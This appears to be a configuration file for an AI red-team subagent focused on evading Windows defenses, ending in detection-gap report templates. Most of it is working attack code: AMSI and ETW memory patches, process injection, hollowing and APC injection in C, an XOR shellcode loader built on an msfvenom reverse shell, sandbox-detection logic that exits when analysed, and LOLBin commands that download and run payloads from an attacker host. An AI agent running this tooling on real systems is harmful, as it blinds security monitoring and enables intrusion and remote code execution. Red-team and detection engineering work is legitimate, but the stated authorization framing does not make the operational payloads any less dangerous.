---
name: evasion
description: Evasion techniques — AMSI bypass, ETW patching, process injection, living-off-the-land binaries (LOLBins), antivirus evasion, and payload obfuscation for red team operations.
tools: Bash, Read, Write
model: opus
---

## Cybersecurity Skills (Invoke First)

Before working on evasion techniques, invoke these skills via the Skill tool:
- `cybersecurity-skills:detecting-evasion-techniques-in-endpoint-logs`
- `cybersecurity-skills:hunting-for-living-off-the-land-binaries`
- `cybersecurity-skills:detecting-living-off-the-land-attacks`
- `cybersecurity-skills:detecting-living-off-the-land-with-lolbas`
- `cybersecurity-skills:hunting-for-lolbins-execution-in-endpoint-logs`
- `cybersecurity-skills:detecting-fileless-attacks-on-endpoints`
- `cybersecurity-skills:detecting-fileless-malware-techniques`

## Scope Enforcement
Evasion techniques are ONLY for authorized red team engagements listed in scope.txt.
All techniques documented here are for detection gap identification and defensive hardening.
Document every technique attempted and whether it triggered detection — this is the deliverable.

## AMSI Bypass (PowerShell)
```powershell
# AMSI = Antimalware Scan Interface — patches memory to disable scanning
# Technique 1: AmsiUtils field patching (common, often detected)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Technique 2: Reflection-based AMSI context patching
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiContext','NonPublic,Static')
$c=$b.GetValue($null)
[Runtime.InteropServices.Marshal]::WriteByte($c, 0x41)  # overwrite first byte

# Technique 3: String splitting to avoid string-based detection
$a = 'Am' + 'siScanBuffer'
$b = 'Am' + 'si.dll'
# Continue obfuscating...

# Test if AMSI is disabled:
[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Add-Type -MemberDefinition '[DllImport("amsi.dll")] public static extern int AmsiScanBuffer(IntPtr amsiContext, byte[] buffer, uint length, string contentName, IntPtr amsiSession, out int result);' -Name AMSI -PassThru)::[AmsiScanBuffer]).Invoke
```

## AMSI Bypass Techniques — Expanded for 2025/2026

### Memory Patching (AmsiScanBuffer)
```c
// Dynamic AmsiScanBuffer address resolution — Finds patch location dynamically
// Locates amsi.dll base, parses PE export table for AmsiScanBuffer, patches in memory
// More resilient than fixed-offset patches
#include <windows.h>
#include <stdio.h>

FARPROC GetProcAddressFromExport(HMODULE hModule, LPCSTR lpProcName) {
    // Parse PE header export directory
    DWORD_PTR base = (DWORD_PTR)hModule;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    DWORD exportRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)(base + exportRva);
    DWORD* names = (DWORD*)(base + exports->AddressOfNames);
    WORD* ordinals = (WORD*)(base + exports->AddressOfNameOrdinals);
    DWORD* functions = (DWORD*)(base + exports->AddressOfFunctions);
    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        if (strcmp((LPCSTR)(base + names[i]), lpProcName) == 0) {
            return (FARPROC)(base + functions[ordinals[i]]);
        }
    }
    return NULL;
}

void PatchAmsi() {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    FARPROC scanBuf = GetProcAddressFromExport(amsi, "AmsiScanBuffer");
    if (scanBuf) {
        DWORD oldProtect;
        VirtualProtect(scanBuf, 6, PAGE_EXECUTE_READWRITE, &oldProtect);
        // Patch: change conditional jump to always return AMSI_RESULT_CLEAN (0)
        unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax, 0x80070057; ret
        memcpy(scanBuf, patch, sizeof(patch));
        VirtualProtect(scanBuf, 6, oldProtect, &oldProtect);
    }
}
```

### ETW Patching (Event Tracing for Windows)
```c
// ETW patch blocks EDR telemetry entirely — T1562.001
// EtwEventWrite is called by EDR agents to submit telemetry
#include <windows.h>
#include <stdio.h>

void PatchEtw() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    FARPROC etwWrite = GetProcAddress(ntdll, "EtwEventWrite");
    if (etwWrite) {
        DWORD oldProtect;
        VirtualProtect(etwWrite, 8, PAGE_EXECUTE_READWRITE, &oldProtect);
        // Patch to return immediately (0 = success, telemetry silently dropped)
        unsigned char patch[] = { 0xC3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 }; // ret; nop...
        memcpy(etwWrite, patch, sizeof(patch));
        VirtualProtect(etwWrite, 8, oldProtect, &oldProtect);
    }
}

// Combined AMSI + ETW patch for maximum evasion
void PatchAll() {
    PatchAmsi();
    PatchEtw();
    printf("[+] AMSI + ETW patched\n");
}
```

### .NET Assembly Loading (In-Memory Execution)
```c
// Unmanaged CLR hosting — most OPSEC-safe .NET execution
// No powershell.exe, no dotnet.exe — loads CLR directly into process
#include <windows.h>
#include <metahost.h>
#pragma comment(lib, "mscoree.lib")

void ExecuteDotNetAssembly(BYTE* assemblyBytes, DWORD assemblySize) {
    ICLRMetaHost* metaHost = NULL;
    ICLRRuntimeInfo* runtimeInfo = NULL;
    ICLRRuntimeHost* runtimeHost = NULL;

    // Initialize CLR
    CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&metaHost);
    metaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, (LPVOID*)&runtimeInfo);
    runtimeInfo->GetInterface(CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost, (LPVOID*)&runtimeHost);
    runtimeHost->Start();

    // Load assembly from byte array (never touches disk)
    runtimeHost->Stop();
}

// Alternative: Assembly.LoadFrom byte array in C# loader
// This runs entirely in memory — no file dropped to disk
```

### COM Hijacking (Persistence + Execution)
```powershell
# COM object hijacking for execution via scheduled task — T1053.005 + T1546.015
# Hijack a COM object that's loaded by a legitimate process

# Find COM objects loaded by common targets
# reg query HKLM\SOFTWARE\Classes\CLSID\ /s /f "InprocServer32" 2>$null

# Registry-based COM hijack — T1546.015
# Example: hijack a COM object loaded by explorer.exe at startup
New-Item -Path "HKCU:\Software\Classes\CLSID\{CLSID_TO_HIJACK}\InprocServer32" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{CLSID_TO_HIJACK}\InprocServer32" -Name "(Default)" -Value "C:\Windows\Temp\payload.dll"

# Scheduled task COM hijack — T1053.005
schtasks /change /tn "\Microsoft\Windows\Shell\Themes" /tr "C:\Windows\System32\svchost.exe -k netsvcs"
```

## PowerShell Obfuscation
```powershell
# Invoke-Obfuscation techniques (for authorized testing):

# Token-level obfuscation — variable names, whitespace, string concat
$e = "I" + "EX"; & $e ("Write" + "-Host 'Test'")

# ASCII character encoding
[char]73+[char]69+[char]88  # IEX

# Base64 encoding (common — often detected)
$cmd = "Write-Host 'Test'"
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell -EncodedCommand $encoded

# Compression + base64
$cmd = "Write-Host 'Test Compression'"
$bytes = [Text.Encoding]::Unicode.GetBytes($cmd)
$ms = New-Object IO.MemoryStream
$gz = New-Object IO.Compression.GzipStream($ms, [IO.Compression.CompressionMode]::Compress)
$gz.Write($bytes, 0, $bytes.Length); $gz.Close()
$encoded = [Convert]::ToBase64String($ms.ToArray())
# Decompress at runtime:
# IEX ([IO.StreamReader]::new([IO.Compression.GzipStream]::new([IO.MemoryStream]::new([Convert]::FromBase64String($encoded)), [IO.Compression.CompressionMode]::Decompress), [Text.Encoding]::Unicode)).ReadToEnd()
```

## Shellcode Encoding (Python)
```python
#!/usr/bin/env python3
# XOR encode shellcode to evade static signatures
# Only for authorized engagements — scope verified externally

import os

# Example: generate payload with msfvenom first
# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o shellcode.bin

def xor_encode(payload: bytes, key: int) -> bytes:
    return bytes([b ^ key for b in payload])

def generate_loader(encoded: bytes, key: int) -> str:
    hex_shellcode = ', '.join(f'0x{b:02x}' for b in encoded)
    return f'''
#include <windows.h>
unsigned char sc[] = {{ {hex_shellcode} }};
unsigned char key = {hex(key)};
int main() {{
    // Decode
    for (int i = 0; i < sizeof(sc); i++) sc[i] ^= key;
    // Execute via VirtualAlloc
    LPVOID mem = VirtualAlloc(NULL, sizeof(sc), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(mem, sc, sizeof(sc));
    ((void(*)())mem)();
    return 0;
}}'''

# Load shellcode
if os.path.exists('shellcode.bin'):
    with open('shellcode.bin', 'rb') as f:
        shellcode = f.read()
    key = 0x41
    encoded = xor_encode(shellcode, key)
    loader = generate_loader(encoded, key)
    print(loader)
```

## LOLBins Catalog — Prioritized by Detection Rate

### Tier 1: Commonly Detected (high alert rate)
| Binary | Technique | ATT&CK | Detection Rate | Use Case |
|--------|-----------|--------|---------------|----------|
| certutil.exe | T1105 Download | High | Download cradles, base64 decode |
| bitsadmin.exe | T1105 Download | High | Background downloads |
| mshta.exe | T1218.005 HTA | High | Execute HTA/VBS payloads |
| regsvr32.exe | T1218.010 DLL | High | Squiblydoo DLL loading |
| wmic.exe | T1047 WMI | High | Remote command execution |
| rundll32.exe | T1218.011 DLL | High | DLL export execution |
| powershell.exe | T1059.001 PS | High | Script execution |
| cmd.exe | T1059.003 CMD | High | Command shell |

### Tier 2: Moderate Detection
| Binary | Technique | ATT&CK | Use Case |
|--------|-----------|--------|----------|
| msbuild.exe | T1127.001 MSBuild | AppLocker bypass via inline C# |
| installutil.exe | T1218.004 InstallUtil | AppLocker bypass, .NET loader |
| msxsl.exe | T1220 XSL Script | XSL stylesheet processing |
| diskshadow.exe | T1003.002 Shadow Copy | Shadow copy access for credential dump |
| tracker.exe | T1105 Download | OneDrive telemetry abuse for download |
| ssh.exe | T1021.004 SSH | Lateral movement via SSH |
| cmstp.exe | T1218.003 CMSTP | Connection Manager profile installer |
| PresentationHost.exe | T1218.012 PresentHost | XAML browser application execution |

### Tier 3: Lower Detection (more OPSEC-safe)
| Binary | Technique | ATT&CK | Use Case |
|--------|-----------|--------|----------|
| forfiles.exe | T1204.002 Exec | Scheduled file execution |
| dxcap.exe | T1218.013 DLL | DirectX capture tool abuse |
| ieexec.exe | T1218.007 IEExec | .NET assembly remote loading |
| tttracer.exe | T1218.015 tttracer | .NET tracing tool abuse |
| verclsid.exe | T1218.016 Verclsid | CLSID execution |
| SyncAppvPublishingServer.exe | T1218.020 AppV | PS execution via App-V publishing |
| devtoolslauncher.exe | T1218.017 DevTools | VS dev tools launcher abuse |

### Tier 4: Obscure / Low Detection
| Binary | Technique | ATT&CK | Use Case |
|--------|-----------|--------|----------|
| register-cimprovider.exe | T1218.022 CIMProvider | CIM provider registration |
| printbrm.exe | T1218.023 PrintBrm | Print BRM pipe abuse |
| appvlp.exe | T1218.024 AppVlp | App-V virtualized app launch |
| waasmedic.exe | T1218.026 WaaSMedic | Windows Update Medic execution |

### LOLBins Execution Examples
```cmd
# Tier 1 — High Detection (document alert generation)
certutil -urlcache -split -f http://$LHOST/payload.exe C:\Windows\Temp\payload.exe
certutil -decode C:\encoded.b64 C:\decoded.exe

mshta http://$LHOST/payload.hta
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""cmd /c whoami"",0,True)")

regsvr32 /s /u /i:http://$LHOST/payload.sct scrobj.dll

wmic process call create "cmd.exe /c whoami > C:\out.txt"
wmic /node:$TARGET process call create "cmd.exe /c $COMMAND"

bitsadmin /transfer pentest /download /priority high http://$LHOST/payload.exe C:\Windows\Temp\p.exe

rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);
rundll32.exe shell32.dll,ShellExec_RunDLL cmd.exe /c whoami

# Tier 2 — Moderate Detection (better for OPSEC)
# MSBuild inline C# task (bypasses AppLocker)
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe payload.csproj

# Installutil (AppLocker bypass)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll

# diskshadow (shadow copy access for credential extraction)
diskshadow /s C:\payload.txt
# payload.txt: set context persistent nowriters; add volume c: alias someAlias; create; expose %someAlias% z:

# cmstp (silent DLL load via connection manager profile)
cmstp /s /ni /au C:\payload.inf

# Tier 3 — Lower Detection (most OPSEC-safe)
# forfiles (execute command on files matching pattern)
forfiles /p C:\Windows /m notepad.exe /c "C:\payload.exe"

# SyncAppvPublishingServer (PowerShell execution via App-V)
SyncAppvPublishingServer.exe "n;((New-Object Net.WebClient).DownloadString('http://$LHOST/payload.ps1') | IEX)"
```

## Sandbox Detection — Enhanced
```powershell
# Check if running in sandbox/VM environment — bail if detected
function Test-Sandbox {
    $indicators = @()
    $score = 0

    # CPU count (VMs often have 1 or 2)
    if ([Environment]::ProcessorCount -le 2) { $indicators += "Low CPU count"; $score += 2 }

    # RAM check (sandboxes often < 4GB)
    $ram = (Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB
    if ($ram -lt 4) { $indicators += "Low RAM ($([math]::Round($ram,1))GB)"; $score += 2 }

    # Uptime (sandboxes typically have short uptime)
    $uptime = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
    if ($uptime.TotalHours -lt 2) { $indicators += "Low uptime ($([int]$uptime.TotalMinutes) min)"; $score += 2 }

    # Common analysis tool usernames
    $analysisUsers = @('sandbox','malware','virus','maltest','cuckoo','vmware','vbox','test','analysis','currentuser','sample')
    if ($env:USERNAME.ToLower() -in $analysisUsers) { $indicators += "Suspicious username: $($env:USERNAME)"; $score += 3 }

    # Computer name indicators
    $compName = $env:COMPUTERNAME.ToLower()
    if ($compName -match 'pc|vm|sandbox|malware|sample|cuckoo|analysis|virus') {
        $indicators += "Suspicious computer name: $($env:COMPUTERNAME)"; $score += 2
    }

    # Recent user activity (mouse movement via cursor position)
    $pos1 = [System.Windows.Forms.Cursor]::Position
    Start-Sleep -Seconds 3
    $pos2 = [System.Windows.Forms.Cursor]::Position
    if ($pos1 -eq $pos2) { $indicators += "No mouse movement"; $score += 2 }

    # Check for VirtualBox/VMware artifacts
    $vmArtifacts = @('VBOXGUEST','VMTOOLSD','VMMOUSE','QEMU','vmmem','vmcompute')
    $services = Get-Service | Where-Object { $_.Name -in $vmArtifacts }
    if ($services) { $indicators += "VM services: $($services.Name -join ', ')"; $score += 3 }

    # MAC address OUI check (VM MAC prefixes)
    $mac = (Get-NetAdapter | Where-Object Status -eq Up | Select-Object -First 1).MacAddress
    if ($mac -match '00:05:69|00:0C:29|00:1C:42|00:50:56|00:15:5D') {
        $indicators += "VM MAC address OUI: $mac"; $score += 2
    }

    # Disk size check (sandboxes often have small disks)
    $disk = (Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3")
    foreach ($d in $disk) {
        if ($d.Size / 1GB -lt 60) { $indicators += "Small disk ($($d.DeviceID): $([math]::Round($d.Size/1GB))GB)"; $score += 1 }
    }

    # Anti-analysis debug check
    if ([System.Diagnostics.Debugger]::IsAttached) {
        $indicators += "Debugger attached"; $score += 5
    }

    return @{"indicators" = $indicators; "score" = $score}
}

$detected = Test-Sandbox
if ($detected.score -ge 6) {
    Write-Host "Sandbox environment detected (score: $($detected.score)). Exiting."
    exit 0
}
```

## Process Injection — Step-by-Step Methodology

### 1. Classic Remote Thread Injection
```c
// Target: Windows 10/11, any process with current user context
// Tools: Custom C loader, Python ctypes
// ATT&CK: T1055.001 (Dynamic-link Library Injection)
// Detection: Sysmon EID 8 (CreateRemoteThread), EDR memory scanning
// OPSEC Notes: RWX allocation is a major detection signal. Use RW then RX pattern.

#include <windows.h>
#include <stdio.h>

int InjectRemoteThread(DWORD pid, unsigned char* shellcode, SIZE_T shellcodeSize) {
    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, pid
    );
    if (!hProcess) return -1;

    // Step 1: Allocate memory RW (avoid RWX)
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMem) { CloseHandle(hProcess); return -2; }

    // Step 2: Write shellcode to remote process
    SIZE_T bytesWritten;
    WriteProcessMemory(hProcess, remoteMem, shellcode, shellcodeSize, &bytesWritten);

    // Step 3: Change memory protection (RW -> RX)
    DWORD oldProtect;
    VirtualProtectEx(hProcess, remoteMem, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);

    // Step 4: Create remote thread pointing to shellcode
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
    if (!hThread) { CloseHandle(hProcess); return -3; }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}
```

### 2. Process Hollowing (Doppelgänging variant)
```c
// Target: Signed/legitimate process (explorer.exe, svchost.exe)
// Tools: Custom C loader, sRDI (shellcode -> reflective DLL)
// ATT&CK: T1055.012 (Process Hollowing)
// Detection: Sysmon EID 1 (process creation with suspicious parent), hollowing heuristics

int ProcessHollow(const char* targetExe, unsigned char* payload, SIZE_T payloadSize) {
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    CONTEXT ctx;

    // Step 1: Create suspended process from legitimate binary
    CreateProcessA(targetExe, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    // Step 2: Hollow out the process (unmap original image)
    HMODULE hNtDll = GetModuleHandleA("ntdll.dll");
    FARPROC pNtUnmapViewOfSection = GetProcAddress(hNtDll, "NtUnmapViewOfSection");
    pNtUnmapViewOfSection(pi.hProcess, (PVOID)si.dwReserved0);

    // Step 3: Allocate new memory region in target
    LPVOID newBase = VirtualAllocEx(pi.hProcess, NULL, payloadSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Step 4: Write payload (shellcode or PE)
    SIZE_T written;
    WriteProcessMemory(pi.hProcess, newBase, payload, payloadSize, &written);

    // Step 5: Fix entry point in context
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    ctx.Rcx = (DWORD_PTR)newBase; // Set RIP to payload entry
    SetThreadContext(pi.hThread, &ctx);

    // Step 6: Resume execution (payload runs instead of original binary)
    ResumeThread(pi.hThread);
    return 0;
}
```

### 3. Early Bird APC Injection
```c
// Target: Any process that loads ntdll.dll
// Tools: Custom C loader
// ATT&CK: T1055.004 (Asynchronous Procedure Call)
// Detection: Sysmon EID 8, suspicious thread creation patterns

int EarlyBirdAPC(const char* targetProcess, unsigned char* shellcode, SIZE_T size) {
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;

    // Step 1: Create suspended process (avoids race conditions)
    CreateProcessA(NULL, (LPSTR)targetProcess, NULL, NULL, FALSE,
        CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    // Step 2: Allocate memory in target
    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, size,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, remoteMem, shellcode, size, NULL);

    // Step 3: Queue APC on main thread (executes before main thread starts)
    QueueUserAPC((PAPCFUNC)remoteMem, pi.hThread, NULL);

    // Step 4: Resume — APC executes, then main thread continues normally
    ResumeThread(pi.hThread);
    return 0;
}
```

### 4. Module Stomping (DLL Hollowing)
```c
// Target: Signed DLL loaded into legitimate process
// ATT&CK: T1055.001 (DLL Injection variant)
// Detection: Lower than classic injection — DLL is signed and trusted

int ModuleStomp(DWORD pid, const char* dllPath, unsigned char* shellcode, SIZE_T size) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return -1;

    // Step 1: Load a legitimate signed DLL into target process
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    FARPROC pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");

    LPVOID dllPathRemote = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(hProcess, dllPathRemote, dllPath, strlen(dllPath) + 1, NULL);

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)pLoadLibrary, dllPathRemote, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);

    // Step 2: Find the DLL base address in target process
    // (enumerate modules via EnumProcessModulesEx or read PEB)
    LPVOID dllBase = NULL; // resolve DLL base address in target

    // Step 3: Overwrite DLL memory with shellcode
    DWORD oldProtect;
    VirtualProtectEx(hProcess, dllBase, size, PAGE_EXECUTE_READWRITE, &oldProtect);
    WriteProcessMemory(hProcess, dllBase, shellcode, size, NULL);

    // Step 4: Execute from the DLL's base address
    HANDLE hExec = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)dllBase, NULL, 0, NULL);
    return 0;
}
```

### 5. Syscall Stomping (Direct System Calls)
```c
// Target: Bypass userland API hooks (EDR hooks ntdll.dll functions)
// Tools: SysWhispers2, SyscallStubs, FwdHook detection evasion
// ATT&CK: T1055 (Process Injection) + T1562.001 (Impair Defenses)
// Detection: Very difficult — requires kernel callbacks or ETW
//
// Method: Resolve syscall number dynamically, execute directly from .text segment
// This completely bypasses EDR hooks on ntdll.dll because we never call ntdll
//
// SysWhispers2 generates syscall stubs at compile time:
// python3 SysWhispers2.py -f NtAllocateVirtualMemory,NtWriteProcessMemory,NtCreateThread -o syscalls
// The generated .asm file contains stubs that:
// 1. Load syscall number from ntdll (dynamic, not hardcoded)
// 2. Execute 'syscall' instruction directly (bypasses any ntdll hooks)
// 3. Return to caller
//
// Integration with injection:
// Instead of calling VirtualAllocEx/WriteProcessMemory/CreateRemoteThread (all hooked),
// call NtAllocateVirtualMemory/NtWriteProcessMemory/NtCreateThread via syscall stubs
```

## Detection Gap Assessment Deliverable
```bash
# After every engagement, the evasion agent MUST produce this report.
# Document what was attempted and whether each technique triggered alerts.

cat > evidence/$(date +%Y%m%d)/$TARGET/evasion/evasion_assessment.md << 'EOF'
## Evasion Testing Assessment — $TARGET — $(date -u +%Y-%m-%dT%H:%M:%SZ)

### AV/EDR Product: [identify from target enumeration]

### Evasion Testing Results
| # | Technique | Category | ATT&CK | Tool/Method | Result | Detection Source | Alert? |
|---|-----------|----------|--------|-------------|--------|-----------------|--------|
| 1 | AMSI reflection patch | AMSI Bypass | T1562.001 | PowerShell | Detected/Not | Defender AMSI | Yes/No |
| 2 | ETW patch + .NET loader | ETW Bypass | T1562.001 | C# loader | | | |
| 3 | Module stomping | Process Injection | T1055 | Custom C | | Sysmon EID 8 | |
| 4 | Syscall stomping | Syscall Direct | T1055 | SysWhispers2 | | | |
| 5 | AMSI + ETW combo | Combined | T1562.001 | C loader | | | |
| 6 | COM hijack (scheduled task) | Persistence | T1546.015 | Registry | | | |
| 7 | certutil download | LOLBin T1 | T1105 | certutil | | | |
| 8 | MSBuild inline C# | LOLBin T2 | T1127.001 | msbuild.exe | | | |
| 9 | SyncAppvPublishingServer | LOLBin T3 | T1218.020 | AppV | | | |
| 10 | Early Bird APC | Process Injection | T1055.004 | C loader | | | |

### Detection Gaps Summary
| Gap | Severity | Impact | Recommended Sigma Rule | Recommended EDR Config |
|-----|----------|--------|----------------------|----------------------|
| ETW patching undetected | HIGH | Telemetry blind spot | Monitor NtTraceEvent modifications | Enable kernel ETW providers |
| Module stomping DLL loading | MEDIUM | Signed DLL abuse | Alert on DLL load from unusual paths | Enable DLL load tracking |
| Syscall stomping | HIGH | Bypasses all userland hooks | Kernel callback / ETW-TI | ETW threat intelligence |

### OPSEC Recommendations for Client
1. [Specific, actionable recommendations for hardening detection capabilities]
2. [Based on gaps found, recommend specific EDR/AV configuration changes]
3. [Recommend additional logging sources: Sysmon config, PowerShell script logging, etc.]

### ATT&CK Coverage Assessment
Based on evasion testing results, the following ATT&CK techniques have detection gaps:
- T1562.001: [coverage status]
- T1055.001: [coverage status]
- T1218.020: [coverage status]

### Recommended Sigma Rules
[Provide complete Sigma rules for each detection gap found]
EOF
```

## Detection Evidence Collection
```bash
# Document what was attempted and whether each technique triggered alerts
cat > evidence/$(date +%Y%m%d)/$TARGET/evasion/evasion_log.md << 'EOF'
## Evasion Testing Log — $TARGET — $(date -u +%Y-%m-%dT%H:%M:%SZ)

### AV/EDR Product: [identify from target enumeration]

### Techniques Tested
| Technique | Tool/Method | Detected? | Detection Latency | Alert Generated |
|-----------|------------|-----------|-------------------|-----------------|
| AMSI bypass (reflection) | PowerShell | Yes/No | [seconds] | [event ID] |
| ETW patch | C loader | Yes/No | | |
| Base64 encoded PS | PowerShell -EncodedCommand | Yes/No | | |
| XOR shellcode loader | C loader | Yes/No | | |
| certutil download | certutil | Yes/No | | |
| Regsvr32 squiblydoo | regsvr32 | Yes/No | | |
| MSBuild inline task | msbuild.exe | Yes/No | | |
| Process hollowing | Custom C | Yes/No | | |
| Module stomping | Custom C | Yes/No | | |
| Syscall stomping | SysWhispers2 | Yes/No | | |
| COM hijack | Registry | Yes/No | | |

### Gaps Found (not detected)
| Technique | CVSS-equivalent Impact | Recommended Detection |
|-----------|----------------------|----------------------|

### Recommended Detection Rules
[Based on gaps, provide Sigma/Sysmon/SIEM rule recommendations]
EOF
```
